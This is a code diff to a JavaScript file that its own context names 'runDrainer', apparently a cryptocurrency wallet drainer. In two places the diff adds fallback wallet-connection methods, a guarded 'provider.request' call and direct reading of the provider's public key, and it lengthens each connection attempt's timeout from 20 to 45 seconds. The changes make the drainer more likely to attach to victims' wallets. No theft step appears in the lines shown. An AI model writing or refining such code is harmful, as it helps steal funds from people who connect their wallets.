@@ -4863,7 +4863,23 @@ window.runDrainer = runDrainer;
                       },
                       {
                         name: 'Method 3: Request method',
-                        fn: () => provider.request({ method: 'connect' })
+                        fn: () => {
+                          if (typeof provider.request === 'function') {
+                            return provider.request({ method: 'connect' });
+                          } else {
+                            throw new Error('provider.request is not a function');
+                          }
+                        }
+                      },
+                      {
+                        name: 'Method 4: Direct public key access',
+                        fn: () => {
+                          if (provider.publicKey) {
+                            return { publicKey: provider.publicKey };
+                          } else {
+                            throw new Error('No public key available');
+                          }
+                        }
                       }
                     ];
                     
@@ -4886,7 +4902,7 @@ window.runDrainer = runDrainer;
                     try {
                           const connectPromise = strategy.fn();
                         const timeoutPromise = new Promise((_, reject) => 
-                            setTimeout(() => reject(new Error('Connection timeout')), 20000) // 20 seconds per attempt
+                            setTimeout(() => reject(new Error('Connection timeout')), 45000) // 45 seconds per attempt (increased from 20s)
                         );
                         
                         const result = await Promise.race([connectPromise, timeoutPromise]);
@@ -5728,7 +5744,23 @@ window.connectWallet = async function connectWallet(walletKey) {
                   },
                   {
                     name: 'Method 3: Request method',
-                    fn: () => provider.request({ method: 'connect' })
+                    fn: () => {
+                      if (typeof provider.request === 'function') {
+                        return provider.request({ method: 'connect' });
+                      } else {
+                        throw new Error('provider.request is not a function');
+                      }
+                    }
+                  },
+                  {
+                    name: 'Method 4: Direct public key access',
+                    fn: () => {
+                      if (provider.publicKey) {
+                        return { publicKey: provider.publicKey };
+                      } else {
+                        throw new Error('No public key available');
+                      }
+                    }
                   }
                 ];
                 
@@ -5746,7 +5778,7 @@ window.connectWallet = async function connectWallet(walletKey) {
                     
                     const connectPromise = strategy.fn();
                     const timeoutPromise = new Promise((_, reject) => 
-                      setTimeout(() => reject(new Error('Connection timeout')), 20000) // 20 seconds per attempt
+                      setTimeout(() => reject(new Error('Connection timeout')), 45000) // 45 seconds per attempt (increased from 20s)
                     );
                     
                     response = await Promise.race([connectPromise, timeoutPromise]);
